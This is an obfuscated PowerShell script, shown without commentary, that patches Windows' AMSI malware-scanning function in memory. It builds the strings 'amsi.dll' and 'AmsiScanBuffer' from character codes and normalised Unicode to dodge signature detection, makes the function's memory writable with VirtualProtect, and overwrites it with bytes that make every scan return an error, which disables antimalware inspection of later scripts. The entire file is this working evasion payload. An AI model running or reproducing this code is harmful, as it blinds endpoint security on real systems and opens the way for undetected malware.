$ePD3OvZNEIyiYS1 = @"
using System;
using System.Runtime.InteropServices;
public class ePD3OvZNEIyiYS1 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr TdciNpQDIVX2IqgPw, string wKVSilbqoQ2s3ybP8IgC);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr teU3xco42XYf80iwu, UIntPtr iKA3h987_, uint I8Oy, out uint QkHcrnX0P);
}
"@

Add-Type $ePD3OvZNEIyiYS1

$_NVcSm9XO = [ePD3OvZNEIyiYS1]::LoadLibrary("$([cHAr]([BYTe]0x61)+[chAr]([bYtE]0x6d)+[ChAr]([ByTe]0x73)+[chAR]([bytE]0x69)+[CHar](46)+[chAR](74+26)+[cHaR]([ByTE]0x6c)+[cHaR]([bYte]0x6c))")
$exswc9__AGFnNu = [ePD3OvZNEIyiYS1]::GetProcAddress($_NVcSm9XO, "$(('À'+'m'+'s'+'î'+'S'+'c'+'ã'+'n'+'B'+'ù'+'f'+'f'+'è'+'r').noRMaLiZe([cHAr](50+20)+[chaR]([byTe]0x6f)+[chaR]([bYte]0x72)+[chaR]([byTE]0x6d)+[Char]([byte]0x44)) -replace [ChaR]([ByTE]0x5c)+[CHaR]([bYtE]0x70)+[chAR](123*24/24)+[chAr]([Byte]0x4d)+[ChaR]([ByTE]0x6e)+[cHaR]([byTe]0x7d))")
$p = 0
[ePD3OvZNEIyiYS1]::VirtualProtect($exswc9__AGFnNu, [uint32]5, 0x40, [ref]$p)
$Pg8_3HVFCiS = "0xB8"
$glWbCd_0JTyWooI8 = "0x57"
$LldFTbTcgmtVm = "0x00"
$znPovxy7nskvR = "0x07"
$vagFWMKv = "0x80"
$MmAXtbP7oWaCGuMyY = "0xC3"
$Fbjy_KCpVfMIw = [Byte[]] ($Pg8_3HVFCiS,$glWbCd_0JTyWooI8,$LldFTbTcgmtVm,$znPovxy7nskvR,+$vagFWMKv,+$MmAXtbP7oWaCGuMyY)
[System.Runtime.InteropServices.Marshal]::Copy($Fbjy_KCpVfMIw, 0, $exswc9__AGFnNu, 6)